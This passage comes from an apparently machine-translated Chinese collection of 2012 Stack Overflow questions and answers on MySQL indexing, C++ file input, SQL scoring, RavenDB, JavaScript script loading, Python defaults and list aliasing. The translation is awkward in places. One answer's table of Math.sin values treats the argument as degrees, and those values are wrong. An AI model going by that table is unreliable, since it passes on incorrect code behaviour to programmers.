 `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
 `client_id` int(10) unsigned NOT NULL,
 `service_provider_id` int(10) unsigned NOT NULL,
 `account_number` varchar(45) NOT NULL,
 `label` varchar(128) DEFAULT NULL,
 `service_provider_name` varchar(45) NOT NULL,
 `client_name` varchar(45) NOT NULL,
 PRIMARY KEY (`id`),
 KEY `client_id` (`client_id`,`account_number`)
) ENGINE=InnoDB; 
```

表 2
~11,000,000 行

```
CREATE TABLE `invoices_fact` (
 `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
 `invoice_number` varchar(45) NOT NULL COMMENT '    ',
 ...
 ...
 `tracking_number` varchar(45) DEFAULT NULL,
 `division_id` int(11) DEFAULT NULL,
 `client_accounts_dim_id` int(10) unsigned NOT NULL,
 `invoice_date_dim_id` bigint(20) DEFAULT NULL,
 `shipment_date_dim_id` bigint(20) NOT NULL,
 `received_date_dim_id` bigint(20) NOT NULL,
 PRIMARY KEY (`id`),
 KEY `fk_invoice_details_client_accounts_dim1_idx` (`client_accounts_dim_id`),
 KEY `invoice_date_dim_id` (`invoice_date_dim_id`),
 KEY `shipment_date_dim_id` (`shipment_date_dim_id`,`client_accounts_dim_id`,`division_id`,`tracking_number`),
 CONSTRAINT `fk_invoice_details_client_accounts_dim1` FOREIGN KEY (`client_accounts_dim_id`) REFERENCES `client_accounts_dim` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION
) ENGINE=InnoDB; 
```

第一个查询我在哪里进行基本连接

```
SELECT count(distinct tracking_number) as val, p.division_id as division_id 
FROM client_accounts_dim c, invoices_fact p 
WHERE c.id = p.client_accounts_dim_id
AND p.division_id IN (2,3,7)
AND c.client_id = 17
AND p.shipment_date_dim_id between 20120101 and 20121108
GROUB BY p.division_id; 
```

28 秒内运行
解释产量

```
+----+-------------+-------+------+------------------------------------------------------------------+---------------------------------------------+---------+---------+------+-------------+
| id | select_type | table | type | possible_keys                                                    | key                                         | key_len | ref     | rows | Extra       |
+----+-------------+-------+------+------------------------------------------------------------------+---------------------------------------------+---------+---------+------+-------------+
|  1 | SIMPLE      | c     | ref  | PRIMARY,client_id                                                | client_id                                   | 4       | const   |   49 | Using index |
|  1 | SIMPLE      | p     | ref  | fk_package_details_client_accounts_dim1_idx,shipment_date_dim_id | fk_package_details_client_accounts_dim1_idx | 4       | c.id    |  913 | Using where |
+----+-------------+-------+------+------------------------------------------------------------------+---------------------------------------------+---------+---------+------+-------------+ 
```

通过首先运行查询，然后将 client_accounts_dim_ids 放入，查询我“手动”在哪里进行连接。

```
SELECT count(distinct tracking_number) as val, p.division_id as division_id 
FROM invoices_fact p
WHERE division_id in (2,3,7)
AND p.client_accounts_dim_id IN ( 232, 233, 234, 277, 235, 236, 279, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 278, 280, 262, 263, 264, 252, 256, 254, 259, 261, 257, 266, 276, 267, 255, 258, 274, 273, 272, 271, 269, 270, 268, 275, 253, 265, 260 )
AND p.shipment_date_dim_id between 20120101 and 20121108 
GROUP BY p.division_id; 
```

在 1.6 秒内运行
解释产量：

```
+----+-------------+-------+-------+------------------------------------------------------------------+------------------------+---------+------+---------+--------------------------+
| id | select_type | table | type  | possible_keys                                                    | key                    | key_len | ref  | rows    | Extra                    |
+----+-------------+-------+-------+------------------------------------------------------------------+------------------------+---------+------+---------+--------------------------+
|  1 | SIMPLE      | p     | range | fk_package_details_client_accounts_dim1_idx,shipment_date_dim_id | shipment_date_dim_id   | 19      | NULL | 4991810 | Using where; Using index |
+----+-------------+-------+-------+------------------------------------------------------------------+------------------------+---------+------+---------+--------------------------+ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:35:18.503

MySQL 确实应该首先查看最小的表，它是 - `client_accounts_dim`。你已经给了它索引，所以它可以很容易地`client_id`提取信息。`client_id=17`

然后，mysql 需要将其`id`加入到`invoice_fact`. 你已经给它了`fk_invoice_details_client_accounts_dim1_idx`这个任务。这一切听起来很合理！

现在，两个问题，一个难，一个容易。第一的：

> 一旦 MySQL 在您的索引中找到了 client_accounts_dim.client_id=17 的行，它是如何获得它需要加入的 client_id 的？

第二个：

> 一旦 MySQL 加入 invoices_fact.client_accounts_dim_id，它如何应用 WHERE 子句中的其余信息？

对于第一个问题，我已经读到 InnoDB 将主键放入所有后续索引中，但我无法确定一个明确的解释，即它将用于您的连接。我建议将其设为明确的复合索引：

```
client_accounts_dim (client_id, id) 
```

对于第二个问题，一旦 MySQL 在索引中找到了连接信息，它就必须从磁盘中读取所有适当的行，以查看其中哪些在您指定的分区和日期范围内。救援的另一个综合指数：

```
invoices_fact (client_accounts_dim_id, division_id, shipment_date_dim_id) 
```

注意：将第 2 列和第 3 列按正确顺序排列，最低基数列在前。

现在，MySQL 可以只困扰您的索引来收集完整的行列表！

除了上面讨论的用于连接的列之外，您似乎只使用了一列 - `invoices_fact.tracking_number`。如果将它添加到索引中，MySQL 可以从索引中获取查询所需的所有内容，而无需从磁盘读取底层行。

```
invoices_fact (client_accounts_dim_id, division_id, shipment_date_dim_id, tracking_number) 
```

注意：`tracking_number`是一个宽列，它会增加你的索引，减慢写入速度，占用更多磁盘空间等。你可以同时测试它。

希望这可以帮助。

# c++ - 将 .txt 中的数据输入到结构数组中

> ID：13328156
> 
> 赞同：1
> 
> 时间：2012-11-11T02:44:47.623
> 
> 标签：c++, arrays, struct

对于我的 C++ 作业，我有一个 .txt 文档，其中包含按如下顺序排列的建筑信息：

建筑名称 建造年份 纬度坐标 经度坐标

前任。

```
Parking Deck
1993
34.2252
37.5563
Admin Building
1985
34.2356
37.5734 
```

我必须将其读入我创建的结构的数组中：

```
struct list 
{
    char name[50];
    int yearBuilt;
    double latCoord;
    double lonCoord;
} building; 
```

现在我创建了一个 for 循环来将数据读入我创建的类型列表数组：

```
list buildingnumber[SIZE]; //array for buildings 
```

但是当我尝试打印出“k”个最早的建筑物时，它显示数组中没有数据

这是我当前的代码：

```
#include <iostream>
#include <fstream>
#include <istream>
#include <cstdlib>
#include <string>

using namespace std;
const int SIZE = 5000;

//struct for building type
struct list 
{
    char name[50];
    int yearBuilt;
    double latCoord;
    double lonCoord;
}building;

list buildingnumber[SIZE]; //array for buildings

void InsertionSort(list buildingnumber[], int buildingsloaded)
{
    int key = 0, i = 0;
    for(int j = 1; j < buildingsloaded; j++)
    {
        key=buildingnumber[j].yearBuilt;
        i=j-1;
        while(buildingnumber[i].yearBuilt > key && i >= 0)
        {
            buildingnumber[i+1] = buildingnumber[i];
            i--;
        }
        buildingnumber[i+1].yearBuilt = key;
    }
}

int main()
{
    char filePath[50];
    ifstream openFile;
    cout << "Enter the path of the building file: ";
    cin.getline(filePath, 50);
    openFile.open(filePath);

    //verify if file is opened + report buildings loaded
    int buildingsloaded = 0;
    if(!openFile.fail())
    {
        while(openFile >> building.name >> building.yearBuilt >> building.latCoord >> building.lonCoord)
        {
            buildingsloaded++;
        }
        cout << buildingsloaded << " buildings have been loaded." << endl;
    }

    // get how many buildings user wants
    int k = 0;
    cout << "How many buildings are you interested in?: ";
    cin >> k;

    //create array
    // loadKbuildings(building, buildingsloaded);
    for(int i = 0; i < k; i++)
    {
        openFile >> buildingnumber[i].name >> buildingnumber[i].yearBuilt >> buildingnumber[i].latCoord >> buildingnumber[i].lonCoord;  
    }

    // insertion sort
    InsertionSort(buildingnumber, buildingsloaded);

    // display earliest k buildings
    cout << "The " << k << " oldest buildings are: " << endl;
    int i = 0;
    while ( i < k )
    {
        cout << buildingnumber[i].name << endl;
        cout << "Year Built: " << buildingnumber[i].yearBuilt << endl;
        cout << "Coordinates: (" << buildingnumber[i].latCoord << "," << buildingnumber[i].lonCoord << ")" << endl;
        cout << endl;
        i++;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T02:48:25.563

问题在这里：

```
if(!openFile.fail())
{
    while(openFile >> building.name >> building.yearBuilt >> building.latCoord >> building.lonCoord)
    {
        buildingsloaded++;
    }
    cout << buildingsloaded << " buildings have been loaded." << endl;
} 
```

您已经阅读了所有数据（计算建筑物的数量）；下次您尝试抓取数据时，它就消失了。

您可以通过在第一次扫描时将建筑物存储在数组中来解决此问题。

```
int c = 0;
if(!openFile.fail())
{
    // *
    while(openFile >> buildingnumber[c].name >> buildingnumber[c].yearBuilt >> buildingnumber[c].latCoord >> buildingnumber[c].lonCoord)
    {
        buildingsloaded++;
        c++;
    }
    cout << buildingsloaded << " buildings have been loaded." << endl;
} 
```

根据 WhozCraig 的评论，星号下方的行仅用一个单词表示建筑物的名称；您应该`cin.getline()`改用并围绕循环条件进行更改。

您显然还应该取出下面的数据读取部分：

```
//create array
// loadKbuildings(building, buildingsloaded);
for(int i = 0; i < k; i++)
{
    openFile >> buildingnumber[i].name >> buildingnumber[i].yearBuilt >> buildingnumber[i].latCoord >> buildingnumber[i].lonCoord;  
} 
```

# php - MySQL 上一个简单查询的优化

> ID：13328166
> 
> 赞同：0
> 
> 时间：2012-11-11T02:46:50.727
> 
> 标签：php, mysql, sql, performance

我有脚本：

```
SELECT *, (pbct_hits + (COUNT(likes.rvw_usr_like) * 5) - (COUNT(unlikes.rvw_usr_like)) * 5) AS score
FROM tb_publications
LEFT JOIN tb_reviews_users likes ON likes.rvw_usr_fk_publication = pbct_id AND likes.rvw_usr_like IS TRUE
LEFT JOIN tb_reviews_users unlikes ON unlikes.rvw_usr_fk_publication = pbct_id AND unlikes.rvw_usr_like IS FALSE
GROUP BY pbct_id
ORDER BY score DESC; 
```

我不想对同一张表进行两次连接。

我相信可以优化上述脚本，但我没有得到。

# 编辑

问题解决了：

```
-- Final Script:
SELECT pbct.*
FROM tb_publications pbct
LEFT JOIN tb_reviews_users ON rvw_usr_fk_publication = pbct_id
GROUP BY pbct_id
ORDER BY
(
(pbct_hits * 1) +
((SUM(CASE WHEN rvw_usr_like IS TRUE THEN 1 ELSE 0 END)) * 5) -
((SUM(CASE WHEN rvw_usr_like IS FALSE THEN 1 ELSE 0 END)) * 5)
) DESC, pbct_record ASC; 
```

基于@MikeSmithDev 的回答。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T03:44:01.613

关于什么

```
SELECT pbct_id, 
score = 
  (pbct_hits + 
     ((SUM(CASE WHEN rvw_usr_like IS TRUE THEN 1 ELSE 0 END)) * 5) -
     ((SUM(CASE WHEN rvw_usr_like IS FALSE THEN 1 ELSE 0 END)) * 5))
    FROM tb_publications
    LEFT JOIN tb_reviews_users likes ON likes.rvw_usr_fk_publication = pbct_id 
    GROUP BY pbct_id 
```

那应该可以工作......或者在 php 端使用数学在 SQL 中做一些更简单的事情

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T03:02:01.613

我不会在查询中做这样的数学运算。我会做：

```
SELECT *
FROM tb_publications
LEFT JOIN tb_reviews_users review_users ON review_users.rvw_usr_fk_publication = pbct_id
GROUP BY pbct_id 
```

然后我会在php中手动进行数学运算

```
$score = 0;
if($row['rvw_usr_like'])
   $score += 5; 
```

此外，根据您是更频繁地插入喜欢还是显示分数，您可能需要考虑在发布表中存储总分数。

# asp.net-mvc-4 - RavenHQ 索引查询返回 (500) 内部服务器错误

> ID：13328167
> 
> 赞同：0
> 
> 时间：2012-11-11T02:46:53.847
> 
> 标签：asp.net-mvc-4, ravendb

我原来的问题可以在这里找到： [RavenDB 索引查询问题](https://stackoverflow.com/questions/13166439/ravendb-query-on-datetime-with-value-in-collection-offset)

我现在使用以下索引得到了很好的效果：

```
public class JobsQueuedListCurrent : AbstractIndexCreationTask<AppointmentReminder, JobsQueuedListCurrent.IndexResult>
{
    public class IndexResult
    {
        public int Id { get; set; }
        public DateTime AppointmentDateTime { get; set; }
        public ReminderStatus ReminderStatus { get; set; }
        public DateTime JobDateTime { get; set; }
        public JobStatus JobStatus { get; set; }
    }

    public JobsQueuedListCurrent()
    {

        Map = appointmentreminders => from appointmentreminder in appointmentreminders
                                      from job in appointmentreminder.NotificationJobs
                                      where (appointmentreminder.ReminderStatus != ReminderStatus.Confirmed)

                                      select new 
                                      { 
                                          Id = appointmentreminder.Id, 
                                          AppointmentDateTime = appointmentreminder.AppointmentDateTime,
                                          ReminderStatus = appointmentreminder.ReminderStatus,
                                          JobDateTime = appointmentreminder.AppointmentDateTime.AddDays(job.DaysOffset),
                                          JobStatus = job.JobStatus
                                      };

        Store(x => x.AppointmentDateTime, FieldStorage.Yes);
        Store(x => x.ReminderStatus, FieldStorage.Yes);
        Store(x => x.JobDateTime, FieldStorage.Yes);
        Store(x => x.JobStatus, FieldStorage.Yes);

    }
} 
```

我将代码从本地机器移到 AppHarbor 和 RavenHQ。我现在可以在 Appharbor 和 RavenHQ 中连接和查询普通数据。我的控制器看起来像：

```
public ActionResult GetJobsQueuedListCurrent()
    {
        var jobsqueuedlist = RavenSession.Query<JobsQueuedListCurrent.IndexResult, JobsQueuedListCurrent>()
            .OrderBy(x => x.AppointmentDateTime)
            .As<AppointmentReminder>()
            .Take(20)
            .ToList();

        return View("List", jobsqueuedlist);

    } 
```

当我添加以下 where 子句时，效果很好：

```
.Where(x => (x.JobDateTime <= DateTime.Now)) 
```

使控制器看起来像：

```
public ActionResult GetJobsQueuedListCurrent()
    {
        var jobsqueuedlist = RavenSession.Query<JobsQueuedListCurrent.IndexResult, JobsQueuedListCurrent>()
            .Where(x => (x.JobDateTime <= DateTime.Now))
            .OrderBy(x => x.AppointmentDateTime)
            .As<AppointmentReminder>()
            .Take(20)
            .ToList();

        return View("List", jobsqueuedlist);

    } 
```

现在这会导致错误 (500)：内部服务器错误，输出的 pastebin 链接如下：

[巴斯宾](http://pastebin.com/HXvC15jn)

我可以做些什么来允许查询在 Where 子句中使用日期时间？顺便说一句，我在我的客户端上使用最新的不稳定 (1.2.2139-Unstable) 与 RavenHQ 交谈。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T09:18:14.540

您正在使用 1.2 客户端与 1.0 服务器通信。

# java - Java中的跳跃算法

> ID：13328174
> 
> 赞同：3
> 
> 时间：2012-11-11T02:48:35.823
> 
> 标签：java, algorithm

我在 2D Java 游戏中制作了一种重力，我正在尝试创建一个跳跃算法。我环顾四周，找不到任何关于在波浪中上下移动的算法的帮助。

以下是 Game.java 中的代码：

```
package game;

import java.awt.*;

public class Game extends GameLoop{

    public void init(){
        setSize(864,480);
        Thread th = new Thread(this);
        th.start();
        offscreen = createImage(864,480);
        d = offscreen.getGraphics();
        addKeyListener(this);
    }

    public void paint(Graphics g){
        d.clearRect(0, 0, 864, 480);
        d.drawImage(background, 0, 0, this);
        d.drawImage(person, x, y, this);
        g.drawImage(offscreen, 0, 0, this);
    }

    public void update(Graphics g){
        paint(g);
    }
} 
```

这是 GameLoop.java 中的代码：

```
package game;

import java.applet.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

import javax.imageio.*;

public class GameLoop extends Applet implements Runnable, KeyListener{

    public int x, y;
    public Image offscreen;
    public Graphics d;
    public boolean up, down, left, right;
    public BufferedImage background, w1, w2, w3, w4, w5, w6, w7, w8, person, s1, s2;
    public int counter, counter2;

    public void run(){
        x = 100;
        y = 100;
        try {
            background = ImageIO.read(new File("background.png"));
            w1 = ImageIO.read(new File("walk1.png"));
            w2 = ImageIO.read(new File("walk2.png"));
            w3 = ImageIO.read(new File("walk3.png"));
            w4 = ImageIO.read(new File("walk4.png"));
            w5 = ImageIO.read(new File("walk5.png"));
            w6 = ImageIO.read(new File("walk6.png"));
            w7 = ImageIO.read(new File("walk7.png"));
            w8 = ImageIO.read(new File("walk8.png"));
            s1 = ImageIO.read(new File("stancel.png"));
            s2 = ImageIO.read(new File("stancer.png"));
        } catch (IOException e1) {
            e1.printStackTrace();
        }
        person = s1;
        while(true){
            x = 100;
            y = 100;
            while(true){
                if (y <= 304 && up != true){
                    y+=10;
                }
                counter++;
                counter2++;
                if (counter >= 20){
                    counter = 0;
                }
                if (counter >= 0 && counter <= 5 && right == true){
                    person = w1;
                }
                if (counter > 5 && counter < 10 && right == true){
                    person = w2;
                }
                if (counter >= 10 && counter <= 15 && right == true){
                    person = w3;
                }
                if (counter > 15 && right == true){
                    person = w4;
                }
                if (counter2 >= 20){
                    counter2 = 0;
                }
                if (counter2 >= 0 && counter2 <= 5 && left == true){
                    person = w5;
                }
                if (counter2 > 5 && counter2 < 10 && left == true){
                    person = w6;
                }
                if (counter2 >= 10 && counter2 <= 15 && left == true){
                    person = w7;
                }
                if (counter2 > 15 && left == true){
                    person = w8;
                }
                if (left == true){
                    x-=4;
                }
                if (right == true){
                    x+=4;
                }
                if (up == true){
                    y-=4;
                }
                if (down == true){
                    y+=4;
                }
                if ( x <= -10 ){
                    x = -10;
                }
                if ( y <= 0 ){
                    y = 0;
                }
                if ( x >= 824 ){
                    x = 824;
                }
                if ( y >= 304 ){
                    y = 304;
                }
                repaint();
            try{
                Thread.sleep(20);
            } catch(InterruptedException e){
                e.printStackTrace();
            }
            }
        }
    }

    //@Override
    public void keyPressed(KeyEvent e) {
        if(e.getKeyCode() == 37){
            left = true;
        }
        if(e.getKeyCode() == 38){
            up = true;
        }
        if(e.getKeyCode() == 39){
            right = true;
        }
        if(e.getKeyCode() == 40){
            down = true;
        }
    }

    //@Override
    public void keyReleased(KeyEvent e) {
        if(e.getKeyCode() == 37){
            left = false;
            person = s2;
        }
        if(e.getKeyCode() == 38){
            up = false;
        }
        if(e.getKeyCode() == 39){
            right = false;
            person = s1;
        }
        if(e.getKeyCode() == 40){
            down = false;
        }
    }

    //@Override
    public void keyTyped(KeyEvent e) {
    }
} 
```

我想我需要一个 counter ，`counter3`作为一个 double ，但我不确定一个算法会上升到 y 轴上的某个点，然后向下移动。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-11T03:06:11.080

最简单的波函数之一是我们的老朋友`sine`：

![在此处输入图像描述](../Images/d397a157e1921bf72a81d3836c87489d.png)

所以对于一个跳跃动作，你可能会喜欢一个`sine`周期的前半部分。您可以使用，从to`java.util.Math`传递一系列数字（多少取决于您希望跳转到最后的帧数）。 *例如*：`0``180`

 *```
Math.sin(0.0);   // = 0.0 
Math.sin(30.0);  // = 0.5
Math.sin(60.0);  // = 0.9
Math.sin(90.0);  // = 1.0
Math.sin(120.0); // = 0.9
Math.sin(150.0); // = 0.5
Math.sin(180.0); // = 0.0 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T03:03:36.977

我不完全确定您所说的“在波浪中上下移动”是什么意思。

但无论如何，在现实世界的物理学中，自由落体（忽略空气阻力）物体的高度遵循抛物线；即它遵循如下公式：

```
altitude =  maxAltitude - (acceleration * (t - timeOfMaxAltitude))^2 
```

（还有其他制定运动定律的方法，但这种方法可能是您对简单游戏所需要的。）

* * *

1/2 正弦波看起来很像截断的抛物线，*可以*在游戏中使用。但是，您需要意识到它不是对真实世界物理的准确模拟，尤其是对于跳高。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T03:02:59.537

您可以使用变量来表示垂直速度。跳跃时，将垂直速度设置为负值。在每一帧上，将垂直速度添加到垂直位置，并在速度上添加一个常数以模拟重力。当下面有东西时，将速度设置回 0。尝试使用恒定值以获得适当的跳跃高度。*

# javascript - 将 2 个脚本合并为 1 个文件

> ID：13328176
> 
> 赞同：0
> 
> 时间：2012-11-11T02:49:22.053
> 
> 标签：javascript

我有两个脚本加载到我的头部区域，它们是：

```
 <script type="text/javascript">
       var myDate = new Date();
       var myStamp = ""+myDate.getDate()+myDate.getMonth()+myDate.getFullYear()+myDate.getHours()+myDate.getMinutes();
       document.write('<script type="text/javascript" src="https://scriptlocation.com/js/script.js?' + myStamp + '"><\/script>');
    </script>
    <script type="text/javascript">
       document.write('<script type="text/javascript" src=""https://scriptlocation.com/js/script2.js?'+SVNInfo.revision+'"><\/script>');
    </script> 
```

我的理想方案是将这两个合并到 1 个 javascript 文件中，因此我尝试创建一个包含以下内容的新文件：

```
 var myDate = new Date();
       var myStamp = ""+myDate.getDate()+myDate.getMonth()+myDate.getFullYear()+myDate.getHours()+myDate.getMinutes();
       document.write('<script type="text/javascript" src="https://scriptlocation.com/js/script.js?' + myStamp + '"><\/script>');
       document.write('<script type="text/javascript" src=""https://scriptlocation.com/js/script2.js?'+SVNInfo.revision+'"><\/script>'); 
```

但是，由于脚本未正确加载，这似乎不起作用。我是否需要重写/更改某些内容才能使其正常工作？

一些建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:26:40.167

`SVNInfo`由第一个脚本定义。因此，在执行第一个脚本之前，您不能包含第二个脚本（其源路径包含 的值`SVNInfo`）。

当您`document.write`从块中获取内容时，它会在当前块`<script>`的结束标记之后的位置为 HTML 解析器添加新内容。`</script>`如果该内容本身包含一个`<script>`元素，则其中的脚本在当前脚本完成之前无法开始执行。因此，这些`</script><script>`标签会破坏当前的脚本执行，从而允许插入的脚本`document.write`运行。如果不破坏这一点，您将无法将两个写入都放入同一个脚本中。

您可以按照 pete 建议的方式将脚本元素直接插入 DOM，从而完全避免使用解析器。因为不涉及解析器，所以插入的脚本可以立即执行，无需等待当前脚本块完成。

但是，您需要确保第一个脚本元素已添加到文档并在尝试设置`src`第二个脚本元素之前运行，因为您需要`SVNInfo`做好准备。此外，您应该将脚本附加到`<head>`元素，而不是`<body>`因为写入尚未完全解析的元素可能会导致页面加载在 IE 中中止。

`document.write`如果第二个脚本中的某些内容期望从-invoked 脚本运行，这也可能仍然无法正常工作。由于脚本压缩后无法读取，因此无法从此处真正看到。

鉴于集成文档告诉您它希望您做什么，我会坚持下去；即使您有更好的方法，他们也可能在未来某个时候以依赖于这两个脚本的方式更改`document.write`脚本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T03:05:32.770

这应该可以解决问题。

```
<script type="text/javascript">
    var myStamp = (new Date()).getTime(), //easier way to get a relatively unique timestamp
        script1 = document.createElement('script'),
        script2 = document.createElement('script'),
        body = document.getElementsByTagName('body')[0];
    script1.setAttribute('type', 'text/javascript');
    script1.setAttribute('src', 'https://scriptlocation.com/js/script.js?' + myStamp);
    script2.setAttribute('type', 'text/javascript');
    script2.setAttribute('src', 'https://scriptlocation.com/js/script2.js?' + SVNInfo.revision); //is SVNInfo.revision defined?
    body.appendChild(script1);
    body.appendChild(script2);
</script> 
```

作为记录，`document.write`这是向页面添加脚本的一种极其原始（而不是友好的方式）。只需将它们创建为元素，然后将它们添加到 DOM。

# c++ - 在 windows 上安装 CLD 库并绑定到 Python

> ID：13328180
> 
> 赞同：0
> 
> 时间：2012-11-11T02:50:04.990
> 
> 标签：c++, python, github, language-detection

我需要在 Python 脚本中使用 Chromium 的 Compact Language Detector 库。

AFAIK，有两个项目利用了这个库，但是我在将它们中的任何一个设置在 Windows 7 机器上时遇到了麻烦。

[我在Mike McCandless Original Project](http://blog.mikemccandless.com/2011/10/language-detection-with-googles-compact.html) ( [GoogleCode](http://code.google.com/p/chromium-compact-language-detector/source/search?q=build.win.cmd&origq=build.win.cmd&btnG=Search%20Trunk) ) 中遇到了一些类似的问题，但后来我[在同一个项目](http://mzsanford.com/blog/introducing-libcld)( [github](https://github.com/mzsanford/cld) ) 上发现了 Matt Sanford 的分支。出于这个问题的目的，我将专注于 Matts 项目，因为它似乎已经更频繁地更新（但很高兴得到适用于任一项目的答案）。

*   [将项目](https://github.com/mzsanford/cld)下载为 zip，并解压缩到我的本地驱动器。
*   从 CMD 运行 vcvarsall.bat
*   然后运行 ​​build.win.cmd 批处理文件。这[运行正常](http://pastebin.com/cRbNy6VY)。
*   将生成的 libcld.lib 复制到 ports/python/cld.lib
*   尝试运行[setup.py](https://github.com/mzsanford/cld/blob/master/ports/python/setup.py)但它在第 12 行返回以下内容。

    exceptions.TypeError: **init** () 关键字必须是字符串

++EDIT++ 发现这个[问题](https://github.com/mzsanford/cld/issues/19)：

> setup.py 在 Windows 上失败。解决这个问题的黑客解决方案是让 pkgconfig 返回字典 {'define_macros': [('WIN32',None)], 'libraries': packages}

我有点菜鸟，但不完全确定实施此 hack 的步骤。谁能给我一些稍微详细一点的步骤？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:19:09.123

试试这个补丁（[对我有用](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cld)）：

```
diff --git a/ports/python/setup.py b/ports/python/setup.py
index e1950c3..889f21a 100644
--- a/ports/python/setup.py
+++ b/ports/python/setup.py
@@ -9,7 +9,10 @@ def pkgconfig(*packages, **kw):

 module = Extension('cld',
                    ['pycldmodule.cc'],
-                   **pkgconfig('cld'))
+                   define_macros=[('WIN32', None)],
+                   libraries=['libcld'], 
+                   include_dirs=['..\\..\\'],
+                   library_dirs=['..\\..\\'])

 setup(name='cld',
       version='0.031415', 
```

# performance - 解释 html canvas 图像绘制中的巨大性能差异

> ID：13328184
> 
> 赞同：1
> 
> 时间：2012-11-11T02:51:08.207
> 
> 标签：performance, canvas

在调查一些性能问题时，我偶然发现了以下性能比较：

[http://jsperf.com/fastest-canvas-drawing/2](http://jsperf.com/fastest-canvas-drawing/2)

产生以下结果：

![在此处输入图像描述](../Images/dcc2d29fdc51f99d653f4d52654ab696.png)

这似乎表明，如果您使用除`createObjectURL`图像以外的任何东西，drawImage 将慢 90% 以上。真的是这样吗？为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T02:57:38.827

您是否在 Chrome、Safari 或其他 WebKit 中运行此测试？

`window.URL`在 Chrome 中未定义，您需要`window.webkitURL`改用（尽管[在 Chrome 23 中不再](http://caniuse.com/#feat=bloburls)使用，但使用`mozGetAsFile`无论如何都会杀死您）。您会看到如此快速的结果，因为测试只是在 Chrome 下针对该选项出错。

如您所料，在 Firefox 上，结果更加一致。

# python - 类方法中的 Python 关键字参数

> ID：13328185
> 
> 赞同：3
> 
> 时间：2012-11-11T02:51:31.137
> 
> 标签：python, class, arguments, keyword

我正在尝试编写一个采用 3 个关键字参数的类方法。我以前使用过关键字参数，但似乎无法让它在我的课堂上工作。以下代码：

```
def gamesplayed(self, team = None, startyear = self._firstseason,
                endyear = self._lastseason):

    totalGames = 0

    for i in self._seasons:
        if((i.getTeam() == team or team == "null") and
           i.getYear() >= startyear and i.getYear() <= endyear):

            totalGames += i .getGames()

    return totalGames 
```

产生错误：

> NameError：名称“自我”未定义

如果我取出关键字参数并使它们成为简单的位置参数，它就可以正常工作。因此，我不确定我的问题出在哪里。提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-11T03:04:24.373

```
def gamesplayed(self, team = None, startyear = self._firstseason, endyear = self._lastseason): 
```

在函数声明中，您尝试使用`self`. 然而，这不起作用，因为`self`它只是函数的第一个参数的变量名，它获取对传入的当前实例的引用。因此，`self`尤其不是始终指向当前实例的关键字（与`this`其他语言不同） . 这也意味着在函数声明期间尚未定义变量。

您应该做的是简单地用 预设这些参数`None`，并在这种情况下在函数体内将它们预设为这些值。这还允许用户将值实际解析为产生默认值的方法，而无需从类中的某个位置实际访问这些值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T03:37:18.360

关键字参数的默认值在模块构造时绑定，而不是在类实例构造时绑定。这就是为什么`self`没有在此上下文中定义的原因。

每当您需要一个关键字参数时，关于默认值的相同事实可能会产生各种问题，其中每次调用函数时默认值都会更新。当您运行程序时，您会发现您希望更新的默认值始终设置为模块首次初始化时构造的值。

[正如poke](https://stackoverflow.com/users/216074/poke)和其他人所建议的那样，我建议`None`在这两种情况下都将其用作默认关键字参数。您的代码可能类似于：

```
def gamesplayed(self, team=None, startyear=None, endyear=None):
    if not startyear:
        startyear = self._firstseason
    if not endyear:
        endyear = self._lastseason 
```

# python - python del函数中的“回溯”变量

> ID：13328189
> 
> 赞同：3
> 
> 时间：2012-11-11T02:52:32.480
> 
> 标签：python

python 中的`del`语句，当应用于列表时，会做一些非常奇怪的事情。它不仅会删除相关列表中的条目，而且还会“回溯”以删除从变量派生的任何列表中的相同元素。

例如：

```
>>> x
[1, 2, 3, 4, 5]
>>> z=x
>>> del z[1]
>>> z
[1, 3, 4, 5]
>>> x
[1, 3, 4, 5] 
```

换句话说，即使我将删除应用于`z`，删除也应用于`x`。这种“回溯”没有提出任何其他命令或功能，例如

```
>>> x=[1,2,3,4,5]
>>> z=x
>>> z+[6]
[1, 2, 3, 4, 5, 6]
>>> x
[1, 2, 3, 4, 5] 
```

对 z 应用 add 函数使 x 不受影响，因为它应该这样做。

这让我对我正在处理的删除“NA”脚本感到头疼。您是否知道该`del`语句发生了什么，以及如何解决此问题，以便如果我设置`z=x`然后将 del 应用于`z`，则`x`保持不变？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-11T02:59:21.703

`z = x`不制作列表的副本。z 和 x 现在指向同一个列表。该列表的任何修改都将通过名称 z 和 x 可见。

使用`z + [6]`，您没有将结果分配回`z`。之后尝试打印`z`。它将保持不变，就像`x`.

`z += [6]`有必要将结果分配回，`z`并且它的行为与您的第一个示例相同。

您可以使用以下方法之一复制列表：

```
z = x[:]
z = list(x) 
```

# php - 重命名导致文件访问时间改变

> ID：13328191
> 
> 赞同：1
> 
> 时间：2012-11-11T02:52:46.013
> 
> 标签：php

我正在尝试在同一文件系统上的目录之间移动文件。我遇到的困难是，当我使用`rename()`文件系统上该文件的文件访问时间时发生了变化。

我尝试`shell_exec()`与 mv 一起使用，但由于某种原因，当我以这种方式调用 mv 时，它会复制文件然后删除原始文件，这需要更长的时间。

有什么方法可以在不改变访问时间的情况下快速移动文件？或者我可以打电话后改回来`rename()`吗？

* * *

## 回答 #1

> 赞同：1
> 
